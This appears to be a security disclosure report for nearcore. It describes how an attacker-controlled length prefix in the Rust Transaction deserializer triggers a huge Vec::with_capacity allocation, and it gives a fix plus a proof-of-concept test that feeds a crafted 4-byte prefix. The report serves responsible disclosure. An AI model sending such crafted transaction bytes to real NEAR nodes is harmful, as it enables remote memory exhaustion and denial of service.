**Transaction deserialization uses attacker-controlled length in `Vec::with_capacity can lead to remote memory exhaustion or crash**

Target
https://github.com/near/nearcore 

Protocol

**Vulnerability details**

File Location:
```
core/primitives/src/transaction.rs:L153-L214: custom impl BorshDeserialize for Transaction.
core/primitives/src/transaction.rs:L168-L173: attacker-controlled str_len is used in Vec::with_capacity(str_len as usize) before reading bytes.
Network reachability (peer-provided bytes): chain/network/src/network_protocol/proto_conv/peer_message.rs:L519-L521 (SignedTransaction::try_from_slice(&t.borsh)).
Proof-of-code test (portable): core/primitives/src/transaction.rs:L851-L909 (poc_f02_transaction_deserialize_allocates_on_length_prefix).
```

**Summary**

The custom Transaction deserializer reads 4 bytes as a little-endian str_len and immediately performs Vec::with_capacity(str_len). A malicious peer can craft those 4 bytes to request a huge allocation before providing the corresponding data, causing memory exhaustion/DoS.



In Transaction::deserialize_reader:

The first 4 bytes (u1..u4) are read.
str_len = u32::from_le_bytes(buf) is derived from those bytes.
Vec::with_capacity(str_len as usize) is called immediately.
Only after allocation does it attempt to read str_len bytes.
The comment states an account id is at most 64 bytes, but the code does not enforce that bound prior to allocation.

**Impact Explanation**


Remote memory exhaustion / crash: the allocation size is attacker-controlled and can be very large.
Low-bandwidth amplification: a tiny payload can trigger a large allocation request.
Multiple entry points: this deserializer is reachable from network transaction messages and other ingestion points that parse signed transactions from bytes.
Likelihood Explanation
Transaction decoding is a common, network-facing operation (tx gossip / mempool admission).
The allocation happens before any validation of the claimed string length.
Attackers can craft u2 == 0 to force the V0 deserialization branch while setting a huge str_len via u3/u4.


**Recommendation**
Fix approach
Enforce a strict bound on str_len before allocating (based on protocol/account-id rules; at minimum the stated “≤ 64 bytes”).
Avoid Vec::with_capacity(huge) by using try_reserve (and map allocation failure into InvalidData) even after bounds checks.
Consider removing the “version detection hack” and switching to a robust discriminant/tagged encoding for transaction versions.
Example fix snippet (bound check + safe allocation)

```rust
let str_len = u32::from_le_bytes(buf) as usize;

// Enforce the stated AccountId bound early.
const MAX_ACCOUNT_ID_LEN: usize = 64;
if str_len == 0 || str_len > MAX_ACCOUNT_ID_LEN {
    return Err(std::io::Error::new(
        std::io::ErrorKind::InvalidData,
        format!("AccountId length out of bounds: {str_len}"),
    ));
}

let mut str_vec = Vec::new();
str_vec
    .try_reserve(str_len)
    .map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidData, "AccountId too large"))?;
str_vec.resize(str_len, 0);
reader.read_exact(&mut str_vec)?;
```
This makes oversized lengths fail fast without large allocations, preventing attacker-controlled memory spikes.

Validation steps
##Proof of Concept
A portable PoC test has been added (ignored by default) which:

feeds only the 4-byte prefix that encodes str_len = 64 MiB
makes the reader immediately fail once deserialization tries to read the string bytes
asserts that the process still experiences a large allocation spike (via a counting global allocator)
Location: core/primitives/src/transaction.rs:L851-L909.

Run:

bash

cargo test -p near-primitives poc_f02_transaction_deserialize_allocates_on_length_prefix -- --ignored --nocapture --test-threads=1
rust

```rust
    #[test]
    #[ignore = "Proof-of-code test for F-02; performs a large allocation via attacker-controlled length (run explicitly)"]
    fn poc_f02_transaction_deserialize_allocates_on_length_prefix() {
        struct PrefixOnlyReader {
            // First bytes to return.
            buf: &'static [u8],
            // How many bytes have been served.
            pos: usize,
        }

        impl io::Read for PrefixOnlyReader {
            fn read(&mut self, out: &mut [u8]) -> io::Result<usize> {
                // Serve only the initial prefix bytes, then simulate a peer that stalls / closes.
                if self.pos >= self.buf.len() {
                    return Err(io::Error::new(io::ErrorKind::UnexpectedEof, "payload not sent"));
                }
                let n = std::cmp::min(out.len(), self.buf.len() - self.pos);
                out[..n].copy_from_slice(&self.buf[self.pos..self.pos + n]);
                self.pos += n;
                Ok(n)
            }
        }

        // Craft the first 4 bytes (u1..u4) such that:
        // - u2 == 0 so we go down the V0 "hackery" path
        // - str_len = 0x0400_0000 = 64 MiB
        //
        // Little endian: [0x00, 0x00, 0x00, 0x04]
        const STR_LEN: usize = 64 * 1024 * 1024;
        let prefix: &'static [u8] = &[0x00, 0x00, 0x00, 0x04];

        let baseline = reset_alloc_peak_to_current();

        let mut reader = PrefixOnlyReader { buf: prefix, pos: 0 };
        let res = Transaction::deserialize_reader(&mut reader);
        assert!(res.is_err(), "expected deserialize to fail because payload bytes are not provided");

        let peak = peak_allocated_bytes();
        let delta = peak.saturating_sub(baseline);

        // We expect a large allocation attempt driven by `Vec::with_capacity(STR_LEN)`.
        // Use a conservative threshold to avoid noise from unrelated small allocations.
        let want_min_delta = 48 * 1024 * 1024;
        assert!(
            delta >= want_min_delta,
            "expected peak allocated bytes to increase by at least {want_min_delta} bytes after feeding only the 4-byte length prefix \
             (str_len={STR_LEN}), but delta was {delta} bytes (baseline={baseline}, peak={peak})"
        );
    }
}
```
output
Copy
running 1 test
test transaction::tests::poc_f02_transaction_deserialize_allocates_on_length_prefix ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 141 filtered out; finished in 0.00s
